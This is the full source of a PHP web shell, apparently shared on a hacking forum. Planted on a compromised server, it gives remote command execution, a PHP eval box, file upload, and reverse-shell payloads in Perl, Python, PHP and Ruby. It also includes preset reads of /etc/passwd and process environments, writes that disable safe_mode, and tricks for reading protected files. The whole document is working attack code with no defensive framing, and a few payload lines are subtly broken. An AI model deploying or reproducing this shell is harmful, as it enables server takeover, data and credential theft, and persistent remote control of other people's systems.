<?php
// HackYard priv8 shell made by 0x0(dea) / Alb0zZ Team
// greetz to all the crew members :) n also
// PirateAL, old h4x0rs, malkit.ws, trojanforge
### hackyard.net ###

@error_reporting(E_ERROR | E_PARSE);
// ---
@ini_set("max_execution_time",0);
@set_time_limit(0);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

if(!empty($_FILES['skedari'])){
    $tmp = $_FILES['skedari']['tmp_name'];
    $emri = $_FILES['skedari']['name'];
    move_uploaded_file($tmp, $emri);
}

function dak($xpp){
if(function_exists("system")){
system($xpp);
}
else{
if(function_exists("passthru")){
passthru($xpp);
}
else{
if(function_exists("exec")){
exec($xpp);
}
else{
if(function_exists("shell_exec")){
shell_exec($xpp);
}
else if(function_exists("popen")){
popen($xpp);
}
else{
echo 'required commands are disabled :/';
}
}
}
}
}

?>
<html>
<head>
<meta name="robots" content="noindex">
<title>HackYard shell priv8 by dea(0x0) | Mini bypasser</title>
<style ="text/css">
body{
border:0;
margin:0;
padding:0;
background:#333;
color:gray;
font-family: times, Times New Roman, times-roman, georgia, serif;
}
a:link, a:visited{
color: white;
font-weight: bold;
text-decoration: none;
padding: 3px;
}
textarea{
width: 100%;
height: 300px;
background: #000;
color: gray;
border-top: 1px solid orange;
outline: none;
margin-left:0;
margin-right:0;
}
#tbig{
width: 300px;
background: #000;
color: gray;
border: 1px solid orange;
outline: none;
}
input[type="submit"]{
background: #000;
color: gray;
border: 1px solid orange;
outline: none;
}
select, option, input[type="text"]{
outline: none;
color: gray;
border: 1px solid orange;
outline: none;
background: #000;
}
span{
color: gray;
font-weight: bold;
}
#tsmall{
width: 100px;
background: #000;
color: gray;
border: 1px solid orange;
outline: none;
}
#t20{
width:40px;
background: #000;
color: gray;
border: 1px solid orange;
outline: none;
}
#main{
width: 500px;
}
</style>
</head>
<body>
<img src="https://hackyard.net/forum/images/styles/DarkCore/style_green/logo.png">
<form action="" method="post">
<a href="?action=home">home</a><a href="?action=eval">eval</a><a href="?action=bind">bind</a><a href="?action=info">info</a> | 
<?php
if(isset($_GET['action']) && $_GET['action'] == 'home'){ ?>
 <span>sys&nbsp; » </span> <input type="text" name="exec" id="tbig"> or <select name="execv">
  <option>whoami</option>
  <option>netstat -an</option>
  <option>ls -la</option>
  <option>ls</option>
  <option>uname -a</option>
  <option>dir</option>
  <option>start cmd.exe</option>
  <option>cat /etc/passwd</option>
  <option>cat /etc/hosts</option>
  <option>cat /etc/group/</option>
  <option>cat /etc/motd/</option>
  <option>cat /etc/issue/</option>
  <option>cat /etc/mysql/my.cnf</option>
  <option>cat /proc/self/environ</option>
  <option>cat /proc/environ</option>
  <option>cat /proc/cmdline</option>
</select>
<?php
}
if(isset($_GET['action']) && $_GET['action'] == 'eval'){ ?>
 <span>eval » </span> <input type="text" name="eval" id="tbig"> ex: phpinfo(); or system("ls");
<?php
}
if(isset($_GET['action']) && $_GET['action'] == 'bind'){ ?>
 <span>bind » </span> <input type="text" name="ip" id="tsmall" value="207.0.0.1"> <input type="text" name="port" id="t20" value="1337"><select name="type"><option>perl</option><option>python</option><option>php</option><option>ruby</option></select>nc -v ip port
<?php }
if(empty($_GET['action'])){ ?>
 <span>sys&nbsp; » </span> <input type="text" name="exec" id="tbig">
<?php
}
?><input type="submit" value="GO"></form>
<textarea><?php
if(isset($_POST['exec']) || !empty($_POST['execv']) && empty($_POST['eval']) && empty($_POST['bind'])){
if(empty($_POST['exec'])){
dak($_POST['execv']);
}
else{
dak($_POST['exec']);
}
}
if(isset($_POST['eval'])){
eval(stripslashes($_POST['eval']));
}
if(isset($_POST['ip']) && !empty($_POST['type']) && !empty($_POST['port'])){
$t = $_POST['type'];
$i = $_POST['ip'];
$p = $_POST['port'];

if($t == "perl"){
echo '   done

';
$pl = 'use Socket;$i="'.$i.'";$p='.$p.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
$f = fopen('pwn.pl', 'w');
fputs($f, $pl);
dak("perl pwn.pl");
}
if($t == "python"){
echo '   done

';
$y = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec?t(("'.$i.'",'.$p.'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
$f = fopen('pwn.py', 'w');
fputs($f, $y);
dak("python pwn.py");
}
if($t == "php"){
echo '   done

';
$sock=fsockopen("'.$i.'",'.$p.');exec("/bin/sh -i <&3 >&3 2>&3");
}
if($t == "ruby"){
echo '   done

';
$rb = 'f=TCPSocket.open("'.$i.'",'.$p.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)';
$f = fopen('pwn.rb', 'w');
fputs($f, $rb);
dak("ruby pwn.rb");
}

}

if(isset($_GET['action']) && $_GET['action'] == "info" && empty($_POST['exec']) && empty($_POST['eval']) && empty($_POST['bind'])){
echo "HackYard shell priv8 by dea(0x0) | Mini bypasser ==> sysinfo:

Server: ".gethostbyname($_SERVER["HTTP_HOST"])."    You: ".$_SERVER['REMOTE_ADDR']."    Php: ".phpversion()."    Apache: ".$_SERVER['SERVER_SOFTWARE']."    OS: ".php_uname()."    USER: ".@get_current_user()."    UID: ".@getmyuid()."    GID: ".@getmygid()."
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
";
if(ini_get('safe_mode') == '1'){
echo 'Safe mode: ON
';
}
else{
echo 'Safe mode: OFF
';
}
if(ini_get('magic_quotes_gpc') == '1'){
echo 'Magic_quotes_gpc: ON
';
}
else{
echo 'Magic_quotes_gpc: OFF
';
}
if(function_exists('mysql_connect')){
echo 'Mysql: ON
';
}
else{
echo 'Mysql: OFF
';
}
if(function_exists('mssql_connect')){
echo 'Mssql: ON
';
}
else{
echo 'Mssql: OFF
';
}
if(function_exists('pg_connect')){
echo 'PostgreSQL: ON
';
}
else{
echo 'PostgreSQL: OFF
';
}
if(function_exists('ocilogon')){
echo 'Oracle: ON
';
}
else{
echo 'Oracle: OFF
';
}
if(function_exists('curl_version')){
echo 'Curl: ON
';
}
else{
echo 'Curl: OFF
';
}
if(function_exists('exec')){
echo 'Exec: ON
';
}
else{
echo 'Exec: OFF
';
}
if(!ini_get('open_basedir') != "on"){
echo 'Open_basedir: OFF
';
}
else{
echo 'Open_basedir: ON
';
}
if(!ini_get('ini_restore') != "on"){
echo 'Ini_restore: OFF
';
}
else{
echo 'Ini_restore: ON
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';
}
echo 'Disable_functions: ';
if(ini_get('disable_functions') == ''){
echo '  None';
}
else{
echo ini_get('disable_functions');
}
echo "</textarea>";
}
else{
if(!isset($_POST['exec']) && empty($_POST['eval']) && empty($_POST['bind'])){
dak('dir');
}
}
?></textarea><br><br><center>
<?php


if(isset($_POST['turnoff'])){
$off = $_POST['turnoff'];
if($off == "magic_quotes_gpc"){
$handle = fopen(".htaccess", "a+");
$n = '
php_value magic_quotes_gpc off';
fputs($handle, $n);
fclose($handle);
}
else{
$handle = fopen("php.ini", "a+");
$n = '
safe_mode = Off';
fputs($handle, $n);
fclose($handle);
}
}
if(isset($_POST['bypass']) && !empty($_POST['fileb'])){
$b = $_POST['bypass'];
$f = $_POST['fileb'];
if($b == "show_source"){
show_source($f);
}
if($b == "highlight_file"){
highlight_file($f);
}
if($b == "readfile"){
readfile($f);
}
if($b == "symlink"){
fopen("sym.txt", "w");
symlink($f, "sym.txt");
show_source("sym.txt");
}
if($b == "fopen"){
$f = fopen($f, "r");
$h = fread($f, 8192);
echo stripslashes(htmlentities($h));
}
if($b == "include"){
include($f);
}
if($b == "require"){
require($f);
}
if($b == "posix_getpwuid"){
posix_getpwuid($f);
}
}

if(isset($_GET['action']) && $_GET['action'] == "info" && empty($_POST['exec']) && empty($_POST['eval']) && empty($_POST['bind'])){

}
else{
?>
<form enctype="multipart/form-data" method="post">
<b>upload</b><br><input type="file" name="skedari"><input type="submit" value="GO"></form>
<form action="" method="post">
<b>turn off</b><br>
<select name="turnoff">
<option>safe_mode</option>
<option>magic_quotes_gpc</option>
</select><input type="submit" value="GO"></form>
<form action="" method="post">
<b>bypass</b><br>
<select name="bypass">
<option>show_source</option>
<option>highlight_file</option>
<option>readfile</option>
<option>symlink</option>
<option>fopen</option>
<option>include</option>
<option>require</option>
<option>posix_getpwuid</option>
</select> file:<input type="text" name="fileb"><input type="submit" value="GO"></form>
<?php } ?>HackYard shell priv8 by dea(0x0) | Mini bypasser | <a href="http://hackyard.net">HY</a>
</center>
</body>
</html>